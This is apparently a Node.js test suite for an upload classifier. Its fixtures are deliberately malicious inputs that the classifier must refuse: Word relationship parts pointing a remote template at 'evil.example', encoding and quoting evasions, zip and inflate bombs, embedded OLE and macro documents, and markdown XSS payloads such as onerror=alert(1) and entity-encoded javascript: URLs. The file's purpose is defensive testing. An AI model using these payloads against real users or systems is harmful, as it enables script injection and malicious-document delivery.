// attach-r3.test.mjs — `node attach-r3.test.mjs`
// buzz_security review round 3 (HOLD): must-fix 1 (non-UTF-8 XML parts), must-fix 2 (quote-aware
// Relationship tags), S1 (one inflate budget per upload + entry cap), S1b (streaming 8-byte head inflate),
// S2 (OLE / macro-enabled / nested OOXML-ODF / every ODF content.xml+styles.xml), S3 (text-markup scan).
import { deflateRawSync, inflateRawSync, constants as Z } from "node:zlib";
import { readFileSync, readdirSync } from "node:fs";
import { randomBytes } from "node:crypto";
import { classifyAttachment, xmlStartTags, externalRelationship, inflateHead, decodeHtmlEntities, markupEventHandler, zipDirectory, ZIP_INFLATE_BUDGET, ZIP_PART_MAX, ZIP_MAX_ENTRIES, ZIP_MAX_NESTING, MEDIA_MB } from "./signer.mjs";

let pass = 0, fail = 0;
const ok = (c, m) => (c ? (pass++, console.log("  ✅ " + m)) : (fail++, console.log("  ❌ " + m)));
const reader = (buf) => (start, len) => buf.subarray(start, start + len);
const classify = (name, buf) => classifyAttachment({ name, size: buf.length, read: reader(buf) });
const refused = (name, buf) => { try { classify(name, buf); return null; } catch (e) { return e.message; } };
const why = (m) => (m.match(/unsupported file type \((.*)\)\. Allowed/) || [, m])[1];
const expectRefused = (name, buf, re, label) => { const m = refused(name, buf); ok(m && /declined LOCALLY/.test(m) && re.test(m), `${label} refused${m ? " — " + why(m) : " (WAS ACCEPTED)"}`); };
const expectOk = (name, buf, mime, label) => { let r; try { r = classify(name, buf); } catch (e) { r = { err: e.message }; } ok(r && r.mime === mime, `${label} → ${r && (r.mime || r.err)}`); };

// A real ZIP with a central directory (what Office/LibreOffice and infer see). Entries are [name, data, opts];
// opts.deflate → method 8 (node zlib), opts.dd → flag bit 3 + a signed data descriptor, opts.localName → a
// local-header name that differs from the central one; opts.raw → method 8 with the data used as-is (pre-deflated). zip.comment appends an EOCD comment.
function zip(entries, { comment = "" } = {}) {
  const locals = [], central = [];
  let off = 0;
  for (const [name, data0, o = {}] of entries) {
    const n = Buffer.from(name, "utf8"), ln = Buffer.from(o.localName ?? name, "utf8"), plain = Buffer.from(data0);
    const data = o.raw ? plain : o.deflate ? deflateRawSync(plain) : plain, method = o.deflate || o.raw ? 8 : 0, flags = o.dd ? 8 : 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flags, 6); lh.writeUInt16LE(method, 8);
    if (!o.dd) { lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(plain.length, 22); }
    lh.writeUInt16LE(ln.length, 26);
    const dd = o.dd ? (() => { const d = Buffer.alloc(16); d.writeUInt32LE(0x08074b50, 0); d.writeUInt32LE(data.length, 8); d.writeUInt32LE(plain.length, 12); return d; })() : Buffer.alloc(0);
    locals.push(lh, ln, data, dd);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flags, 8); ch.writeUInt16LE(method, 10);
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(plain.length, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(off, 42);
    central.push(ch, n);
    off += 30 + ln.length + data.length + dd.length;
  }
  const cd = Buffer.concat(central), c = Buffer.from(comment, "latin1");
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10); eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(off, 16); eocd.writeUInt16LE(c.length, 20);
  return Buffer.concat([...locals, cd, eocd, c]);
}
const MAIN = { word: "word/document.xml", xl: "xl/workbook.xml", ppt: "ppt/presentation.xml" };
const ooxml = (dir, extra = []) => zip([["[Content_Types].xml", "<Types/>"], ["_rels/.rels", "<Relationships/>"], [MAIN[dir], "<x/>"], ...extra]);
const odf = (mime, extra = [], content = "<office:document-content/>") => zip([["mimetype", mime], ["content.xml", content], ["styles.xml", "<office:document-styles/>"], ["META-INF/manifest.xml", "<manifest:manifest/>"], ...extra]);
const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", PPTX = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
const ODT = "application/vnd.oasis.opendocument.text", ODS = "application/vnd.oasis.opendocument.spreadsheet", ODP = "application/vnd.oasis.opendocument.presentation";
const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/";
const ATT = R + "attachedTemplate";
const rels = (inner) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${inner}</Relationships>`;
const relDoc = (body, o = { deflate: true }) => ooxml("word", [["word/_rels/settings.xml.rels", body, o]]);
const tpl = `<Relationship Id="rId1" Type="${ATT}" Target="https://evil.example/t.dotm" TargetMode="External"/>`;
const utf16le = (s) => Buffer.from(s, "utf16le"), utf16be = (s) => { const b = Buffer.from(s, "utf16le"); for (let i = 0; i < b.length; i += 2) [b[i], b[i + 1]] = [b[i + 1], b[i]]; return b; };

console.log("must-fix 1 — inspected XML parts must be UTF-8:");
expectRefused("u.docx", relDoc(Buffer.concat([Buffer.from([0xff, 0xfe]), utf16le(rels(tpl))])), /non-UTF-8 \(UTF-16 LE\) XML part/, "UTF-16LE (BOM) .rels with an external template");
expectRefused("u.docx", relDoc(Buffer.concat([Buffer.from([0xfe, 0xff]), utf16be(rels(tpl))])), /non-UTF-8 \(UTF-16 BE\)/, "UTF-16BE (BOM) .rels");
expectRefused("u.docx", relDoc(Buffer.concat([Buffer.from([0xff, 0xfe, 0, 0]), Buffer.alloc(8)])), /non-UTF-8 \(UTF-32 LE\)/, "UTF-32LE BOM .rels");
expectRefused("u.docx", relDoc(Buffer.concat([Buffer.from([0, 0, 0xfe, 0xff]), Buffer.alloc(8)])), /non-UTF-8 \(UTF-32 BE\)/, "UTF-32BE BOM .rels");
expectRefused("u.docx", relDoc(utf16le(rels(tpl))), /NUL byte/, "UTF-16LE .rels without a BOM (NUL bytes)");
expectRefused("u.docx", relDoc(utf16le("<Relationships/>")), /NUL byte/, "benign UTF-16 .rels (fail closed: still refused)");
expectRefused("u.docx", relDoc(Buffer.from(rels("").replace("UTF-8", "UTF-16"))), /declared in a non-UTF-8 encoding/, 'encoding="UTF-16" declaration');
expectRefused("u.docx", relDoc(Buffer.from(rels("").replace(`encoding="UTF-8"`, `encoding='ISO-8859-1'`))), /non-UTF-8 encoding/, "encoding='ISO-8859-1' declaration");
expectRefused("u.docx", relDoc(Buffer.from(rels("").replace(`encoding="UTF-8"`, `encoding=UTF-7`))), /non-UTF-8 encoding/, "unquoted / malformed encoding declaration");
expectRefused("u.docx", relDoc(Buffer.concat([Buffer.from(rels("")), Buffer.from([0xc3, 0x28])])), /not valid UTF-8/, "invalid UTF-8 bytes");
expectRefused("u.docx", relDoc(`<!DOCTYPE r [<!ENTITY e "External">]>` + rels(`<Relationship Type="${ATT}" Target="x" TargetMode="&e;"/>`)), /entity declaration/, "<!ENTITY declaration");
expectRefused("u.docx", relDoc(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(rels(tpl))])), /external attachedTemplate/, "UTF-8 BOM .rels is decoded (and the external template still found)");
expectOk("u.docx", relDoc(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(rels(""))])), DOCX, "UTF-8 BOM + benign .rels");
expectOk("u.docx", relDoc(Buffer.from(rels("").replace("UTF-8", "utf8"))), DOCX, 'encoding="utf8" accepted');
expectOk("u.docx", relDoc(`<?xml version="1.0" standalone="yes"?><Relationships/>`), DOCX, "no encoding declaration accepted");
const ev = `<office:document-content><office:event-listeners><script:event-listener script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.M.Main"/></office:event-listeners></office:document-content>`;
const odfx = (mime, entries) => zip([["mimetype", mime], ["META-INF/manifest.xml", "<m/>"], ...entries]);
expectRefused("e.odt", odfx(ODT, [["content.xml", Buffer.concat([Buffer.from([0xff, 0xfe]), utf16le(ev)]), { deflate: true }]]), /non-UTF-8 \(UTF-16 LE\) XML part \(content\.xml\)/, "ODF UTF-16 content.xml with event listeners");
expectRefused("e.odt", odfx(ODT, [["content.xml", "<c/>"], ["styles.xml", utf16le(ev), { deflate: true }]]), /NUL byte.*styles\.xml/, "ODF UTF-16 styles.xml (no BOM)");
expectRefused("e.odt", odfx(ODT, [["content.xml", "<c/>"], ["Object 1/content.xml", Buffer.concat([Buffer.from([0xfe, 0xff]), utf16be(ev)])]]), /UTF-16 BE.*Object 1\/content\.xml/, "ODF UTF-16 embedded-object content.xml");

console.log("must-fix 2 — quote-aware Relationship tags:");
const tplGt = `<Relationship Id="rId1" Target="https://evil.example/a>b.dotm" Type="${ATT}" TargetMode="External"/>`;
expectRefused("g.docx", relDoc(rels(tplGt)), /external attachedTemplate/, "'>' inside a double-quoted Target, TargetMode after it (tpl_gt)");
expectRefused("g.docx", relDoc(rels(`<Relationship Id='rId1' Target='https://e/a>b' Type='${ATT}' TargetMode='External'/>`)), /external attachedTemplate/, "'>' inside a single-quoted Target");
expectRefused("g.docx", relDoc(rels(`<Relationship Target='x" TargetMode="Internal' Type="${ATT}" TargetMode="External"/>`)), /external attachedTemplate/, "fake TargetMode=\"Internal\" inside a single-quoted Target");
expectRefused("g.docx", relDoc(rels(`<Relationship Target="x Type='${R}image' >" Type="${ATT}" TargetMode="External"/>`)), /external attachedTemplate/, "fake Type='…/image' (and '>') inside a Target");
expectRefused("g.docx", relDoc(rels(`<!-- a " stray quote > --><Relationship Type="${ATT}" Target="x" TargetMode="External"/>`)), /external attachedTemplate/, "a comment with a stray quote before the real tag");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" Target="x" TargetMode="Ext&#x65;rnal"/>`)), /external attachedTemplate/, "TargetMode=\"Ext&#x65;rnal\"");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" Target="x" TargetMode=" External "/>`)), /external attachedTemplate/, "TargetMode with surrounding spaces");
expectRefused("g.docx", relDoc(rels(`<pr:Relationship Type="${ATT}" Target="x" pr:TargetMode="External"/>`)), /external attachedTemplate/, "prefixed element / attribute names");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${R}image" Type="${ATT}" Target="x" TargetMode="External"/>`)), /external attachedTemplate/, "duplicate Type — every value is checked");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" TargetMode="Internal" Target="x" TargetMode="External"/>`)), /external attachedTemplate/, "duplicate TargetMode — every value is checked");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" Target="x>y TargetMode="External"/>`)), /malformed relationships part/, "unterminated quoted value → malformed, fail closed");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" Target="x" TargetMode=External/>`)), /malformed relationships part.*unquoted/, "unquoted attribute value → malformed");
expectRefused("g.docx", relDoc(`<!DOCTYPE x>` + rels("")), /malformed relationships part.*DOCTYPE/, "DOCTYPE in a .rels (OPC forbids DTDs)");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" Target="&ext;" TargetMode="External"/>`)), /malformed relationships part.*undeclared entity/, "undeclared entity in a value");
expectRefused("g.docx", relDoc(rels(`<Relationship Type="${ATT}" Target="x"`)), /malformed relationships part/, "unterminated tag at EOF");
expectOk("g.docx", relDoc(rels(`<Relationship Id="rId1" Type="${R}hyperlink" Target="https://e.example/?a=1&amp;b=%3E" TargetMode="External"/><Relationship Id="rId2" Type="${ATT}" Target="Normal&gt;x.dotm"/>`)), DOCX, "benign: external hyperlink with &amp; and an internal template with &gt;");
{
  const tags = xmlStartTags(`<?xml version="1.0"?><!-- <Relationship TargetMode="External"/> --><R a="1>2" b='x"y'><![CDATA[<Relationship>]]></R>`);
  ok(tags.length === 1 && tags[0].name === "R" && JSON.stringify(tags[0].attrs) === JSON.stringify([["a", "1>2"], ["b", 'x"y']]), "xmlStartTags: comments/CDATA/PI skipped, quoted '>' and the other quote kept");
  ok(externalRelationship(rels(tplGt)) === "attachedTemplate" && externalRelationship(rels(`<Relationship Type="${ATT}" Target="x"/>`)) === null, "externalRelationship: unit");
}

console.log("S1 — one inflate budget per upload (" + ZIP_INFLATE_BUDGET / MEDIA_MB + " MiB), per-part cap (" + ZIP_PART_MAX / MEDIA_MB + " MiB), entry cap (" + ZIP_MAX_ENTRIES + "):");
{
  const big = Buffer.concat([Buffer.from("<Relationships>"), Buffer.alloc(90 * MEDIA_MB, 0x20), Buffer.from("</Relationships>")]);
  const parts = (n) => Array.from({ length: n }, (_, i) => `word/_rels/p${i}.xml.rels`);
  const docN = (n) => ooxml("word", parts(n).map((name) => [name, big, { deflate: true }]));
  const t0 = Date.now();
  expectOk("b.docx", docN(2), DOCX, "two .rels parts inflating to 180 MiB in total (under budget)");
  expectRefused("b.docx", docN(3), /inflates past the 256 MiB inspection budget/, "three .rels parts inflating to 270 MiB in total");
  ok(Date.now() - t0 < 20000, `budget cases took ${Date.now() - t0} ms`);
  const huge = Buffer.concat([Buffer.from("<Relationships>"), Buffer.alloc(129 * MEDIA_MB, 0x20), Buffer.from("</Relationships>")]);
  expectRefused("b.docx", ooxml("word", [["word/_rels/h.xml.rels", huge, { deflate: true }]]), /inflates past the 128 MiB per-part cap/, "one .rels part over 128 MiB");
  // The budget is shared with embedded documents: an embedded .xlsx whose own .rels pushes the total over.
  const inner = ooxml("xl", [["xl/_rels/workbook.xml.rels", big, { deflate: true }]]);
  expectRefused("b.docx", ooxml("word", [["word/_rels/p0.xml.rels", big, { deflate: true }], ["word/_rels/p1.xml.rels", big, { deflate: true }], ["word/embeddings/e.xlsx", inner, { deflate: true }]]), /256 MiB inspection budget/, "budget shared with an embedded .xlsx");
  const many = Array.from({ length: ZIP_MAX_ENTRIES }, (_, i) => [`word/media/i${i}.png`, "x"]);
  expectRefused("m.docx", ooxml("word", many), /more than 10000 ZIP entries/, `${ZIP_MAX_ENTRIES + 3} entries`);
  expectOk("m.docx", ooxml("word", many.slice(0, ZIP_MAX_ENTRIES - 3)), DOCX, `exactly ${ZIP_MAX_ENTRIES} entries`);
}

console.log("S1b — the magic check inflates only the first 8 bytes:");
{
  let mism = 0, cases = 0;
  const kinds = [randomBytes(70000), Buffer.from("hello ".repeat(20000)), Buffer.alloc(300000), Buffer.from("MZ\x90\x00" + "abc".repeat(5000), "latin1"), randomBytes(3), Buffer.alloc(0), Buffer.from("a")];
  for (const data of kinds) for (const level of [0, 1, 6, 9]) for (const strategy of [Z.Z_DEFAULT_STRATEGY, Z.Z_FIXED, Z.Z_HUFFMAN_ONLY, Z.Z_RLE, Z.Z_FILTERED]) {
    const c = deflateRawSync(data, { level, strategy });
    for (const want of [1, 4, 8, 300]) { cases++; const h = inflateHead(c, want); if (!h || !h.equals(data.subarray(0, want))) mism++; }
  }
  for (let i = 0; i < 300; i++) { const d = randomBytes(1 + (i * 37) % 5000); if (i % 2) d.fill(i & 0xff, 0, d.length >> 1); const c = deflateRawSync(d, { level: i % 10 }); cases++; const h = inflateHead(c, 8); if (!h || !h.equals(d.subarray(0, 8))) mism++; }
  // every deflated entry of the real fixtures
  const dir = new URL("./fixtures/uploads/", import.meta.url);
  for (const f of readdirSync(dir).filter((x) => !x.endsWith(".md"))) {
    const b = readFileSync(new URL(f, dir));
    for (const e of zipDirectory(b)) if (e.method === 8) { cases++; const raw = b.subarray(e.dataAt, e.dataAt + e.csize); const h = inflateHead(raw, 8); if (!h || !h.equals(inflateRawSync(raw).subarray(0, 8))) mism++; }
  }
  ok(mism === 0, `inflateHead ≡ inflateRawSync prefix on ${cases} streams (random/text/zeros, levels 0/1/6/9, all strategies, real fixtures)`);
  let agree = 0, garbage = 0;
  for (let i = 0; i < 2000; i++) { const g = randomBytes(1 + (i % 64)); let full = null; try { full = inflateRawSync(g); } catch {} if (full) { garbage++; const h = inflateHead(g, 8); if (h && h.equals(full.subarray(0, 8))) agree++; } }
  ok(agree === garbage, `random garbage that zlib inflates completely: inflateHead agrees (${agree}/${garbage})`);
  ok(inflateHead(Buffer.from([0xff, 0xff, 0xff]), 8) === null && inflateHead(Buffer.from([0x07]), 8) === null, "malformed stream (bad block type) → null");
  ok(inflateHead(deflateRawSync(Buffer.from("abcdefghijk")).subarray(0, 2), 8) === null, "truncated stream → null");
  // 15,000 empty stored blocks (75 KB) before any output → more than HEAD_INPUT_MAX input → null → refused
  const empty = Buffer.alloc(15000 * 5); for (let i = 0; i < 15000; i++) empty.set([0x00, 0x00, 0x00, 0xff, 0xff], i * 5);
  const tail = deflateRawSync(Buffer.from("MZ payload")); const padded = Buffer.concat([empty, tail]);
  ok(inflateRawSync(padded).toString() === "MZ payload" && inflateHead(padded, 8) === null, "8 bytes not reached within 64 KiB of input → null (zlib would read it)");
  expectRefused("p.docx", ooxml("word", [["word/media/x.png", padded, { raw: true }]]), /unreadable entry \(word\/media\/x\.png\)/, "that stream as a docx entry → unreadable entry (fail closed)");
  // headbomb: two media entries of 200 MiB of zeros each (never inspected as XML; each past the 128 MiB per-part
  // cap, 400 MiB in total — past the budget too) — the head check inflates 8 bytes, so this is accepted, quickly
  const zeros = Buffer.alloc(200 * MEDIA_MB);
  const hb = ooxml("word", [["word/media/a.png", zeros, { deflate: true }], ["word/media/b.png", zeros, { deflate: true }]]);
  const t1 = process.hrtime.bigint(); const r = refused("hb.docx", hb); const ms = Number(process.hrtime.bigint() - t1) / 1e6;
  ok(r === null && ms < 500, `headbomb (2 × 200 MiB-of-zeros media) accepted in ${ms.toFixed(1)} ms (< 500)`);
  const mzbomb = ooxml("word", [["word/media/a.png", Buffer.concat([Buffer.from("MZ"), zeros]), { deflate: true }]]);
  const t2 = process.hrtime.bigint(); expectRefused("hb.docx", mzbomb, /Windows executable \(MZ\)/, "MZ + 200 MiB zeros"); ok(Number(process.hrtime.bigint() - t2) / 1e6 < 500, "…quickly");
}

console.log("S2 — embedded content (OLE, macro-enabled, nested OOXML/ODF, every ODF content.xml/styles.xml):");
{
  const OLE = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(504)]);
  expectRefused("o.docx", ooxml("word", [["word/embeddings/Microsoft_Word_97-2003_Document.doc", OLE]]), /legacy OLE compound file/, "embedded legacy .doc (OLE magic, stored)");
  expectRefused("o.docx", ooxml("word", [["word/media/image1.emf", OLE, { deflate: true }]]), /legacy OLE compound file.*image1\.emf/, "OLE magic under a harmless name (deflated)");
  expectRefused("o.odt", odf(ODT, [["Object 1", OLE]]), /legacy OLE compound file.*Object 1/, "ODF embedded OLE object (Object 1)");
  for (const ext of ["docm", "dotm", "xlsm", "xltm", "xlam", "xlsb", "pptm", "potm", "ppsm", "ppam", "sldm"])
    expectRefused("m.docx", ooxml("word", [[`word/embeddings/x.${ext}`, "x"]]), /macro-enabled document/, `embedded .${ext}`);
  expectRefused("m.docx", ooxml("word", [["word/embeddings/Microsoft_Word_Macro-Enabled_Document.docm", ooxml("word"), { deflate: true }]]), /macro-enabled/, "embedded .docm (nested_docm)");
  const xlsx = ooxml("xl");
  expectOk("n.docx", ooxml("word", [["word/embeddings/Microsoft_Excel_Worksheet.xlsx", xlsx, { deflate: true }]]), DOCX, "embedded well-formed .xlsx (chart data) still allowed");
  expectRefused("n.docx", ooxml("word", [["word/media/archive.zip", zip([["run.exe", "MZ"]]), { deflate: true }]]), /embedded word\/media\/archive\.zip: zip archive — not a Word/, "embedded plain .zip with an exe (nested_zip_exe)");
  expectRefused("n.docx", ooxml("word", [["word/media/image1.png", zip([["a.txt", "hi"]]), { deflate: true }]]), /embedded word\/media\/image1\.png: zip archive — not a Word/, "a ZIP (PK head) under a harmless name");
  const evilXlsx = ooxml("xl", [["xl/_rels/workbook.xml.rels", rels(tpl), { deflate: true }]]);
  expectRefused("n.docx", ooxml("word", [["word/embeddings/e.xlsx", evilXlsx, { deflate: true }]]), /external attachedTemplate.*xl\/_rels\/workbook\.xml\.rels/, "embedded .xlsx with an external template rel");
  const vbaXlsx = ooxml("xl", [["xl/vbaProject.bin", "x", { deflate: true }]]);
  ok(deflateRawSync(vbaXlsx).indexOf("vbaProject") < 0, "(fixture) the embedded name is not visible in the deflated outer bytes");
  expectRefused("n.docx", ooxml("word", [["word/embeddings/e.xlsx", vbaXlsx, { deflate: true }]]), /macros \(vbaProject\.bin\)/, "embedded .xlsx with vbaProject.bin (deflated, so only the recursive check sees it)");
  expectRefused("n.docx", ooxml("word", [["word/embeddings/e.xlsx", ooxml("xl", [["xl/media/x.png", "MZ\x90\x00", { deflate: true }]]), { deflate: true }]]), /Windows executable/, "embedded .xlsx with an MZ blob");
  expectRefused("n.pptx", ooxml("ppt", [["ppt/embeddings/e.odt", odf(ODT, [], ev), { deflate: true }]]), /event listeners/, "embedded .odt with event listeners");
  // nesting depth: outer → 1 → 2 is fine; outer → 1 → 2 → 3 is refused
  const lvl2 = ooxml("xl");
  const lvl1 = ooxml("xl", [["xl/embeddings/l2.xlsx", lvl2, { deflate: true }]]);
  expectOk("d.docx", ooxml("word", [["word/embeddings/l1.xlsx", lvl1, { deflate: true }]]), DOCX, `nesting depth ${ZIP_MAX_NESTING} allowed`);
  const lvl1b = ooxml("xl", [["xl/embeddings/l2.xlsx", ooxml("xl", [["xl/embeddings/l3.xlsx", ooxml("xl"), { deflate: true }]]), { deflate: true }]]);
  expectRefused("d.docx", ooxml("word", [["word/embeddings/l1.xlsx", lvl1b, { deflate: true }]]), /nested more than 2 deep/, `nesting depth ${ZIP_MAX_NESTING + 1} refused`);
  expectRefused("x.xlsx", ooxml("xl", [["xl/macrosheets/sheet1.xml", "<xm:macrosheet/>"]]), /Excel 4\.0 macro sheets/, "xl/macrosheets/ (XLM)");
  expectRefused("x.xlsx", ooxml("xl", [["xl/dialogsheets/sheet1.xml", "<d/>"]]), /Excel 4\.0 macro sheets/, "xl/dialogsheets/");
  expectRefused("e.odt", odf(ODT, [["Object 1/content.xml", ev, { deflate: true }]]), /event listeners.*Object 1\/content\.xml/, "ODF embedded-object content.xml with event listeners (odf_ev_obj)");
  expectRefused("e.odt", odf(ODT, [["Object 1/styles.xml", `<x xlink:href="macro:///Standard.M.Main"/>`]]), /referencing a macro.*Object 1\/styles\.xml/, "ODF embedded-object styles.xml with a macro:// link");
  expectRefused("e.ods", odf(ODS, [["Sub/Dir/CONTENT.XML", ev]]), /event listeners/, "any */content.xml (case-insensitive)");
  expectOk("e.odp", odf(ODP, [["Object 1/content.xml", "<office:document-content/>"], ["Object 1/styles.xml", "<s/>"]]), ODP, "benign embedded-object parts");
}

console.log("S3 — text-markup scan:");
{
  const T = "application/octet-stream";
  const txt = (s) => Buffer.from(s);
  for (const [s, re, label] of [
    ['![x](y) <img src=x onerror=alert(1)>', /event-handler attribute \(onerror=\)/, "<img … onerror=> (img_onerror)"],
    ['<a href="#" onclick="x()">hi</a>', /markup|onclick/, "<a … onclick=>"],
    ["<details open ontoggle = alert(1)>", /ontoggle=/, "spaces around '='"],
    ["<IMG SRC=x ONERROR=alert(1)>", /onerror=/, "upper-case"],
    ["<img/onerror=alert(1) src=x>", /onerror=/, "'/' before the handler"],
    ['<p title="a>b" onmouseover=x>', /onmouseover=/, "'>' inside a quoted value does not end the tag (round-3 span)"],
    ['<p title="a>b" onmouseover=x>', /onmouseover=/, "'>' inside a quoted value does not end the tag"],
    ["<p title='a>b' onmouseover=x>", /onmouseover=/, "'>' inside a single-quoted value"],
    ['<a title="x"onclick=y>', /onclick=/, "handler right after a closing quote"],
    [`<${"x".repeat(100)}-el onclick=y>`, /onclick=/, "long custom-element name"],
    ['<b c="unterminated <img src=x onerror=alert(1)>', /onerror=/, "handler inside an unterminated quoted value (fail closed)"],
    ["<div\nonpointerenter=x>", /onpointerenter=/, "handler on the next line"],
    ['<form action="https://evil"><button>go</button></form>', /markup \(<form\)/, "<form (form.md)"],
    ['<base href="https://evil/">', /markup \(<base\)/, "<base (base.md)"],
    ["<input autofocus>", /<input/, "<input"],
    ["<math><mi>x</mi></math>", /<math/, "<math"],
    ['<frame src="x">', /<frame/, "<frame"],
    ["[x](&#106;avascript:alert(1))", /script URL \(javascript:/, "&#106;avascript: (ent_js)"],
    ["[x](&#x6A;avascript:alert(1))", /javascript:/, "&#x6A;avascript:"],
    ["[x](&#0000106avascript:alert(1))", /javascript:/, "&#0000106 (no ';', zero-padded)"],
    ["[x](javascript&colon;alert(1))", /javascript:/, "javascript&colon;"],
    ["[x](java&Tab;script:alert(1))", /javascript:/, "java&Tab;script:"],
    ["[x](jav\tascript:alert(1))", /javascript:/, "literal tab inside the scheme"],
    ["[x](java&NewLine;script:alert(1))", /javascript:/, "java&NewLine;script:"],
    ["[x](vbscript:msgbox(1))", /vbscript:/, "vbscript:"],
    ["[x](data:text/html;base64,PHNjcmlwdD4=)", /data:text\/html/, "data:text/html"],
    ["[x](data:image/svg+xml,...)", /data:image\/svg/, "data:image/svg"],
  ]) expectRefused("x.md", txt("# t\n\n" + s + "\n"), re, label);
  for (const [s, label] of [
    ["The <format> of <base64> data, <inputs>, <mathematics>, <frames>.", "<format>, <base64>, <inputs>, <mathematics>, <frames> (name continues)"],
    ["if (a<b) { online = true }", "a<b) … online = (not a tag: '<b' is followed by ')')"],
    ["x < y and onion=3", "'<' not followed by a name"],
    ["Use <kbd>Ctrl</kbd>; then on=1", "on= outside any tag"],
    ["<https://example.com/?onx=1&online=2>", "autolink with on…= in the query"],
    ["Fish &amp; chips &copy; &#169; &nbsp;", "ordinary entities"],
    ["see data:image/png;base64,AAAA", "data:image/png"],
  ]) expectOk("x.md", txt("# t\n\n" + s + "\n"), T, label);
  ok(decodeHtmlEntities("&#106;&#x61;v&#X61;&colon;&Tab;&bogus;") === "java:\t&bogus;", "decodeHtmlEntities: unit");
  ok(markupEventHandler("<b>x</b> <i onload=1>") === "onload" && markupEventHandler("<b>x</b> onload=1") === null, "markupEventHandler: unit");
  // linear on a pathological input: 2 MB of "<a " with no '>'
  const t0 = Date.now(); markupEventHandler("<a ".repeat(700000)); markupEventHandler('<a b="'.repeat(300000)); markupEventHandler("<a b=".repeat(300000)); ok(Date.now() - t0 < 1000, `markupEventHandler linear on 2 MB of '<a ', '<a b=\"', '<a b=' (${Date.now() - t0} ms)`);
}

console.log("real files (LibreOffice / python-docx / openpyxl / python-pptx) are still accepted:");
{
  const dir = new URL("./fixtures/uploads/", import.meta.url);
  const mimeOf = { docx: DOCX, xlsx: XLSX, pptx: PPTX, odt: ODT, ods: ODS, odp: ODP };
  for (const f of readdirSync(dir).filter((x) => !x.endsWith(".md")).sort()) expectOk(f, readFileSync(new URL(f, dir)), mimeOf[f.split(".").pop()], f);
}

console.log(`\n${fail === 0 ? "ALL PASS" : "FAILURES"}: ${pass} passed, ${fail} failed`);
if (fail) process.exit(1);
